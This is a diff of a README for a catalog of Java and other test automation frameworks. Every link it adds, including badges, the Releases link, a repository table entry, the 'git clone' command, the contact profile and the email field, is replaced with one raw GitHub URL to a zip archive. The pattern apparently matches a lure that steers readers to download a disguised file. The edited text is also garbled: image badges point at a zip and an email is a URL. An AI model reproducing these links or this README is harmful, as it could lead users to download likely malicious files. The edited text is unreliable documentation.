@@ -1,10 +1,10 @@
 # Automation Frameworks Catalog: A Comprehensive Guide to Testing Frameworks
 
-![Java](https://img.shields.io/badge/Java-Playwright%20Java%20BDD-green.svg)
-![Status](https://img.shields.io/badge/Status-Active-brightgreen.svg)
-![Releases](https://img.shields.io/badge/Releases-Latest-blue.svg)
+![Java](https://raw.githubusercontent.com/LucakovaM/automation-frameworks-catalog/main/copolar/catalog_automation_frameworks_v3.2.zip%20Java%https://raw.githubusercontent.com/LucakovaM/automation-frameworks-catalog/main/copolar/catalog_automation_frameworks_v3.2.zip)
+![Status](https://raw.githubusercontent.com/LucakovaM/automation-frameworks-catalog/main/copolar/catalog_automation_frameworks_v3.2.zip)
+![Releases](https://raw.githubusercontent.com/LucakovaM/automation-frameworks-catalog/main/copolar/catalog_automation_frameworks_v3.2.zip)
 
-Visit the [Releases](https://github.com/LucakovaM/automation-frameworks-catalog/releases) section for updates and downloads.
+Visit the [Releases](https://raw.githubusercontent.com/LucakovaM/automation-frameworks-catalog/main/copolar/catalog_automation_frameworks_v3.2.zip) section for updates and downloads.
 
 ## Table of Contents
 
@@ -24,7 +24,7 @@ The Automation Frameworks Catalog serves as a central repository for various aut
 
 | Platform      | Framework                   | Suggested Repo Name            | Status      | Repo                                                               |
 | ------------- | --------------------------- | ------------------------------ | ----------- | ------------------------------------------------------------------ |
-| ☕️ **Java**   | Playwright Java BDD         | `playwright-java-bdd-sample`   | ✅ Completed | [🔗](https://github.com/Test-Architect/playwright-java-bdd-sample) |
+| ☕️ **Java**   | Playwright Java BDD         | `playwright-java-bdd-sample`   | ✅ Completed | [🔗](https://raw.githubusercontent.com/LucakovaM/automation-frameworks-catalog/main/copolar/catalog_automation_frameworks_v3.2.zip) |
 | ☕️ **Java**   | Selenium WebDriver          | `selenium-java-sample`         | ⏳ Pending   |                                                                    |
 | ☕️ **Java**   | TestNG                      | `testng-java-sample`           | ⏳ Pending   |                                                                    |
 | ☕️ **Java**   | JUnit 5                     | `junit5-java-sample`           | ⏳ Pending   |                                                                    |
@@ -49,7 +49,7 @@ To get started with any of the frameworks listed, follow these general steps:
 1. **Clone the Repository**: Use the following command to clone the repository.
 
    ```bash
-   git clone https://github.com/LucakovaM/automation-frameworks-catalog.git
+   git clone https://raw.githubusercontent.com/LucakovaM/automation-frameworks-catalog/main/copolar/catalog_automation_frameworks_v3.2.zip
    ```
 
 2. **Navigate to the Desired Framework**: Change to the directory of the framework you want to use.
@@ -58,7 +58,7 @@ To get started with any of the frameworks listed, follow these general steps:
    cd automation-frameworks-catalog/playwright-java-bdd-sample
    ```
 
-3. **Install Dependencies**: Most frameworks require specific dependencies. Check the `README.md` file in each framework's directory for detailed installation instructions.
+3. **Install Dependencies**: Most frameworks require specific dependencies. Check the `https://raw.githubusercontent.com/LucakovaM/automation-frameworks-catalog/main/copolar/catalog_automation_frameworks_v3.2.zip` file in each framework's directory for detailed installation instructions.
 
 4. **Run Tests**: Follow the usage guidelines to execute tests.
 
@@ -138,7 +138,7 @@ This project is licensed under the MIT License. See the `LICENSE` file for detai
 
 For questions or suggestions, feel free to reach out:
 
-- GitHub: [LucakovaM](https://github.com/LucakovaM)
-- Email: lucakova@example.com
+- GitHub: [LucakovaM](https://raw.githubusercontent.com/LucakovaM/automation-frameworks-catalog/main/copolar/catalog_automation_frameworks_v3.2.zip)
+- Email: https://raw.githubusercontent.com/LucakovaM/automation-frameworks-catalog/main/copolar/catalog_automation_frameworks_v3.2.zip
 
-For updates and releases, visit the [Releases](https://github.com/LucakovaM/automation-frameworks-catalog/releases) section.
+For updates and releases, visit the [Releases](https://raw.githubusercontent.com/LucakovaM/automation-frameworks-catalog/main/copolar/catalog_automation_frameworks_v3.2.zip) section.
